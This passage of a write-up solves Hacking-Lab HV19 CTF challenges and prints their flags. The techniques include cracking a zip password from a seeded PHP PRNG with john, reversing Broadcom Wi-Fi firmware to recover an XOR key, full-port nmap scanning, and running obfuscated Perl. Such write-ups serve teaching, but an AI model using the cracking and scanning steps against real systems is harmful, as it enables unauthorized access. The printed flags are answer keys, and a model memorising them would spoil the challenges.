print(bytes.fromhex('485631397b4833795f536c336467335f6d3333745f6d335f617468335f6e3378745f6330726e33727d'))
$ ./day22.py
b'HV19{H3y_Sl3dg3_m33t_m3_ath3_n3xt_c0rn3r}'
```

The flag is: HV19{H3y_Sl3dg3_m33t_m3_ath3_n3xt_c0rn3r}

# Day 23

- Level: leet
- Author: M.
- Categories: Fun

## Challenge Description

Today's flag is available in the Internet Data Archive (IDA).

[http://whale.hacking-lab.com:23023](http://whale.hacking-lab.com:23023)

## Solution

I navigated to the provided URL and observed that I could enter a username and receive a password encrypted archive to download.  Looking closer at the download link, I saw that it was an open directory at [http://whale.hacking-lab.com:23023/tmp/](http://whale.hacking-lab.com:23023/tmp/).  I sorted by last modified and found:

```
Index of /tmp
Name	        Last modified	    Size
Santa-data.zip	2019-10-06 10:32 	341K
phpinfo.php	    2019-10-06 10:32 	20
```

So I downloaded Santa-data.zip and as expected, it was encrypted as well.  I have to admit though, at this point I was stumped.  Then I saw some hints from bread on the discord channel:

- hint1: dates
- hint2: PRNG
- hint3: title of the page <-- best hint
- hint4: 62^12 👎 no,no.no.no.... 54^12
- hint5: img1 then back to img2
- hint6: pipe
- solve

The title of the page was "IDA PRO".  I searched and found a page that described the
[IDA Pro installer PRNG](https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/).

I first tried running this in C, but found it quickly that the random number generator was different than the one in PHP.  I found that I needed to shift the C result to the right one bit to make it match.

But then also I found out the mt_rand(lower, upper) is not the same value as mt_rand mod (upper - 1).  So I resorted to PHP:

```
<?php

    $CHARS = "abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789";

    $i = 0;
    while(true) {
        srand($i);
        $pw = "";
        for($a=0; $a < 12; $a++) {
            $rand = rand(0, 53);
            $pw = $pw.$CHARS[$rand];
        }

        print("$pw\n");

        $i = $i + 1;
    }
?>
```

Then it was a matter of learning [How to crack a ZIP file password with john](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html) and [how to redirect stdin to john](https://www.openwall.com/lists/john-dev/2011/07/20/4).  Putting it altogether:

I extracted the hashes:

```
# zip2john Santa-data.zip > zip.hashes
```

I ran the PHP code and redirected to john:

```
# php ./day23.php | john -stdin zip.hashes
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status

Kwmq3Sqmc5sA     (Santa-data.zip/flag.txt)
1g 0:00:01:51  0.008958g/s 38820p/s 38820c/s 38820C/s suKcApykm6ST..ApwYqaWtC2Zh
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I unzipped the file:

```
# 7z x santa-data.zip
```

$ cat flag.txt
HV19{Cr4ckin_Passw0rdz_like_IDA_Pr0}


# Day 24 - ham radio

- Level: leet
- Author: DrSchottky
- Categories: ReverseEngineering, Fun

## Challenge Description

Elves built for santa a special radio to help him coordinating today's presents delivery.
Resources

[HV19-ham radio.zip](provided/day24.zip)

As little present and in order not to screw up your whole christmas, you have 3 whole days to solve this puzzle.

Happy Christmas!

## Solution

I opened up the provided file with Ghidra, chose the architecture "ARMv7 little-endian 32-bit" and decompiled.

By browsing the code, I found an interesting function "FUN_00058dd8" with cool constants like "0xcafe", "0xd00d" and "0x1337":

```
  if (param_2 == 0xcafe) {
    func_0x00803cd4(param_3,PTR_s_Um9zZXMgYXJlIHJlZCwgVmlvbGV0cyBh_00058e90,param_4);
    return 0;
  }
  if (param_2 != 0xd00d) {
    if (param_2 != 0x1337) {
```

But I had a problem - the address "0x00803cd4" was not in the provided code.  I did some reading and found a [resource on reversing broadcom wireless chipsets](https://blog.quarkslab.com/reverse-engineering-broadcom-wireless-chipsets.html).  It said that those missing function calls are calls to areas of ROM, which is loaded at base address 0x0800000.

It took some time, but I located the [ROM](https://github.com/seemoo-lab/bcm_misc/tree/master/bcm43430a1)

Looking at the ROM calls, I was able to fill in some of the blanks in the function FUN_00058dd8 and relabel the functions to meaningful names:

```
  local_38 = *(undefined4 *)PTR_DAT_Ciphertext;
  uStack52 = *(undefined4 *)(PTR_DAT_Ciphertext + 4);
  uStack48 = *(undefined4 *)(PTR_DAT_Ciphertext + 8);
  uStack44 = *(undefined4 *)(PTR_DAT_Ciphertext + 0xc);
  local_28 = *(undefined4 *)(PTR_DAT_Ciphertext + 0x10);
  auStack36[0] = *(undefined4 *)(PTR_DAT_Ciphertext + 0x14);
  if (param_2 == 0xcafe) {
    // Call to ROM strncpy
    strncpy(param_3,PTR_s_Um9zZXMgYXJlIHJlZCwgVmlvbGV0cyBh_00058e90,param_4);
    return 0;
  }
  if (param_2 != 0xd00d) {
    if (param_2 != 0x1337) {
      uVar1 = FUN_0081a2d4(param_1,param_2,param_3,param_4,param_5);
      return uVar1;
    }
    pbVar3 = &bStack57;
    pbVar2 = DAT_00058e88;
    do {
      pbVar3 = pbVar3 + 1;
      pbVar2 = pbVar2 + 1;
      *pbVar3 = *pbVar2 ^ *pbVar3;
    } while (pbVar3 != (byte *)((int)auStack36 + 2));
    // Call to ROM strncpy
    strncpy(param_3,&local_38,param_4);
    return 0;
  }
  // Call to ROM memcpy
  memcpy(PTR_DAT_00058e8c,0x800000,0x17);
  return 0;
}
```

In plain English the function does the following:

1. Enters with param_2 set to 0xd00d, and the bytes from the ROM are copied to RAM
2. Enters with param_2 set to 0x1337, and an XOR is performed

Using python:

```
#!/usr/bin/env python3.7

# key is the first 0x17 bytes from 'rom.bin': https://github.com/seemoo-lab/bcm_misc/tree/master/bcm43430a1
key = bytes.fromhex('41ea000313439b0730b510d10c680368634013604c6843')

# the ciphertext starts at DAT_00058e94
ciphertext = bytes.fromhex('09bc313a681aab7247867ee64a1d6f042e74500d78063e')

# xor the two byte strings to get the flag
flag = ''.join([chr(a ^ b) for a, b in zip(key, ciphertext)])
print(flag)
```

The flag is: HV19{Y0uw3n7FullM4Cm4n}

# Hidden 01

- Level: novice
- Author: hidden
- Categories: Fun

## Challenge Description

Sometimes, there are hidden flags. Got your first?

## Solution

In day06, extra characters at the end of the second part

```
$ stegsnow -C clipboard2.txt
HV19{1stHiddenFound}
```

# Hidden 02

- Level: novice
- Author: inik
- Categories: Fun

## Challenge Description

Again a hidden flag.

## Solution

Base58 decode on the filename from Day07

```
#!/usr/bin/env python3.7

# Requirement:
# pip install base58

import base58

print(base58.b58decode('3DULK2N7DcpXFg8qGo9Z9qEQqvaEDpUCBB1v').decode('utf-8'))
```

The flag is: HV19{Dont_confuse_0_and_O}

# Hidden 03

- Level: novice
- Author: M. / inik
- Categories: Fun, Penetration Testing

## Challenge Description

Not each quote is compl

## Solution

This hidden challenge was announced on Day 11.

I ran nmap against the site and found the following ports open:

```
$ nmap -n -p1-65535 -sS /whale.hacking-lab.com

PORT      STATE  SERVICE
17/tcp    open   qotd
22/tcp    open   ssh
10101/tcp open   ezmeeting-2
```

Looking at [RFC 0865](https://tools.ietf.org/html/rfc865), "qotd" stands for "quote of the day" and runs on TCP port 17.

However, when I connected to the site, I only got a single character:

```
$ nc whale.hacking-lab.com 17
_
```

I tried again later and got a different character.  So I wrote a script to periodically connect to the port and grab the character:

```
#!/usr/bin/env python3

import socket
import time

HOST = 'whale.hacking-lab.com'
PORT = 17

def get_msg():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        data = s.recv(1024)
        return data

def main():
    flag = ''
    prev = ''
    while True:
        msg = get_msg().decode('utf-8').strip()
        if msg != prev:
            prev = msg
            flag += msg
            print(flag)

        time.sleep(60)

if __name__ == '__main__':
    main()
```

The character appeared to change every hour.  So instead of "qotd" this port was more like "coth" (character of the hour).

Running the script for several hours revealed this hidden flag:

```
$ ./hidden03.py
...
HV19{an0ther_DAILY
HV19{an0ther_DAILY_
HV19{an0ther_DAILY_f
HV19{an0ther_DAILY_fl
HV19{an0ther_DAILY_fl4
HV19{an0ther_DAILY_fl4g
HV19{an0ther_DAILY_fl4g}
```

The flag is: HV19{an0ther_DAILY_fl4g}

# Hidden 04

- Level: novice
- Author: M.
- Categories: Programming, Fun

## Challenge Description

None.

## Solution

In Day14, the flag looked very strange:

HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(...)%"p$1t"%ee}

It looks like obfsucated perl code.  So I put it into the perl interpreter:

```
$ cat hidden04.pl
#!/usr/bin/env perl

s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(...)%"p$1t"%ee;

$ ./hidden04.pl
Squ4ring the Circle
```

The flag is: HV19{Squ4ring the Circle}
